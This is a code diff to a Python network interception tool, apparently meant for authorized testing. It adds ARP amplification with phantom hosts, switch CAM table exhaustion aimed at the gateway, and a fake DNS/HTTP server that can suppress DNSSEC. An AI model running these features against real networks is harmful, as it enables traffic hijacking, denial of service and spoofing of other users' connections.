@@ -8,11 +8,13 @@ sniffer management, and the bandwidth monitor thread.
 from __future__ import annotations
 
 import fcntl
-from ipaddress import ip_network
+from ipaddress import ip_address, ip_network
 import json
 import logging
 import os
 import socket
+import subprocess  # nosec B404
+import sys
 import tempfile
 import threading
 import time
@@ -75,6 +77,8 @@ class NetShaper:
         self.sniffer: Optional[Union[PacketSniffer, RollingPacketSniffer]] = None
         self.stop_event  = threading.Event()
         self._mitm_log_path: Optional[str] = None
+        self._fake_server_proc: Optional[subprocess.Popen] = None
+        self._arp_amplifier = None
         self._monitor_thread: Optional[threading.Thread] = None
         self._runtime_errors: List[str] = []
         self._started_at: Optional[float] = None
@@ -592,6 +596,8 @@ class NetShaper:
                 "mitmproxy",
                 lambda: getattr(self, "mitm_manager", None) and self.mitm_manager.terminate(),
             )
+            cleanup_step("fake server", self._terminate_fake_server)
+            cleanup_step("ARP amplification", self._stop_arp_amplification)
             cleanup_step("global rules", self._remove_global_rules)
             cleanup_step(
                 "state snapshot",
@@ -640,6 +646,183 @@ class NetShaper:
             pass
 
     # ── Sniffer ───────────────────────────────────────────────────────────────
+    def _ipv4_subnet_for_amplification(self):
+        own = ip_address(self.own_ip)
+        v4_networks = [
+            network for network in self.authorized_cidrs if network.version == 4
+        ]
+        for network in v4_networks:
+            if own in network:
+                return network
+        if v4_networks:
+            return v4_networks[0]
+        raise RuntimeError(
+            "ARP amplification requires at least one authorized IPv4 CIDR."
+        )
+
+    def start_arp_amplification(
+        self,
+        *,
+        phantom_count: int = 0,
+        burst: int = 5,
+        interval: float = 0.1,
+        cam_exhaust: int = 0,
+    ) -> None:
+        if not phantom_count and not cam_exhaust:
+            return
+        if config.DRY_RUN:
+            print_flush(
+                "[DRY-RUN] Would start ARP amplification "
+                f"(phantoms={phantom_count}, cam={cam_exhaust})"
+            )
+            return
+        if not self.gw or not self.gw_mac:
+            raise RuntimeError(
+                "ARP amplification requires a reachable gateway IP and MAC."
+            )
+
+        from netshaper.network.exploit.arp_amplification import (
+            ARPAmplificationProfile,
+            ARPAmplifier,
+        )
+
+        subnet = self._ipv4_subnet_for_amplification()
+        amplifier = ARPAmplifier(self.interface, self.own_mac)
+        bounded_burst = max(1, min(burst, ARPAmplifier.MAX_BURST))
+        bounded_interval = max(ARPAmplifier.MIN_INTERVAL, interval)
+
+        if phantom_count:
+            profile = ARPAmplificationProfile(
+                gateway_ip=self.gw,
+                gateway_mac=self.gw_mac,
+                attacker_mac=self.own_mac,
+                subnet=subnet,
+                phantom_count=phantom_count,
+                burst_size=bounded_burst,
+                cycle_interval=bounded_interval,
+            )
+            amplifier.add_subnet_profile(profile)
+            amplifier.start()
+
+        if cam_exhaust:
+            amplifier.start_cam_exhaustion(
+                self.gw_mac,
+                subnet,
+                phantom_count=cam_exhaust,
+                burst=bounded_burst,
+                interval=bounded_interval,
+            )
+
+        self._arp_amplifier = amplifier
+        log.info(
+            "ARP amplification started "
+            f"(phantoms={phantom_count}, cam={cam_exhaust})"
+        )
+
+    def launch_fake_server(
+        self,
+        *,
+        suppress_dnssec: bool = False,
+        web_security_demo: bool = False,
+        dns_upstream: str = "8.8.8.8",
+    ) -> bool:
+        """Launch netshaper-fake-server when DNS/HTTP services are required."""
+        if config.DRY_RUN:
+            print_flush(
+                "[DRY-RUN] Would launch netshaper-fake-server "
+                f"(dnssec={suppress_dnssec}, hsts={web_security_demo})"
+            )
+            return True
+
+        dns_ready = check_local_port(self.own_ip, 53, socket.SOCK_DGRAM)
+        http_ready = check_local_port(self.own_ip, 80)
+        if dns_ready and (http_ready or not web_security_demo):
+            log.info("fake server ports already reachable")
+            return True
+
+        if self._fake_server_proc and self._fake_server_proc.poll() is None:
+            return dns_ready and (http_ready or not web_security_demo)
+
+        cmd = [
+            sys.executable,
+            "-m",
+            "netshaper.fake_server3",
+            "--host-ip",
+            self.own_ip,
+            "--upstream",
+            dns_upstream,
+        ]
+        if suppress_dnssec:
+            cmd.append("--suppress-dnssec")
+        if web_security_demo:
+            cmd.append("--web-security-demo")
+
+        try:
+            self._fake_server_proc = subprocess.Popen(  # nosec B603
+                cmd,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+        except OSError as exc:
+            log.error(f"fake server launch failed: {exc}")
+            return False
+
+        for _ in range(20):
+            dns_ready = check_local_port(self.own_ip, 53, socket.SOCK_DGRAM)
+            http_ready = check_local_port(self.own_ip, 80)
+            if dns_ready and (http_ready or not web_security_demo):
+                log.info("netshaper-fake-server ready")
+                return True
+            if self._fake_server_proc.poll() is not None:
+                log.error(
+                    "netshaper-fake-server exited during startup "
+                    f"with code {self._fake_server_proc.returncode}"
+                )
+                self._terminate_fake_server()
+                return False
+            time.sleep(0.25)
+
+        log.error("netshaper-fake-server did not become reachable within 5s")
+        self._terminate_fake_server()
+        return False
+
+    def _terminate_fake_server(self) -> bool:
+        proc = getattr(self, "_fake_server_proc", None)
+        if not proc:
+            return True
+
+        ok = True
+        try:
+            if proc.poll() is None:
+                proc.terminate()
+                try:
+                    proc.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                    proc.wait(timeout=5)
+            if proc.poll() is None:
+                ok = False
+            else:
+                log.info("netshaper-fake-server terminated")
+        except Exception as exc:
+            ok = False
+            log.error(f"fake server cleanup failed: {exc}")
+
+        if ok:
+            self._fake_server_proc = None
+        return ok
+
+    def _stop_arp_amplification(self) -> None:
+        amplifier = getattr(self, "_arp_amplifier", None)
+        if not amplifier:
+            return
+        try:
+            amplifier.shutdown()
+        except Exception as exc:
+            log.error(f"ARP amplification cleanup failed: {exc}")
+        finally:
+            self._arp_amplifier = None
+
     def launch_sniffer(self, target_ips: Optional[List[str]] = None,
                        save_pcap: bool = False, rolling: bool = False) -> None:
         if config.DRY_RUN:
@@ -687,6 +870,8 @@ class NetShaper:
     def close(self) -> None:
         """Release non-network resources when a session never started."""
         self._terminate_mitmproxy()
+        self._terminate_fake_server()
+        self._stop_arp_amplification()
         self._release_instance_lock()
 
     # ── State persistence ─────────────────────────────────────────────────────
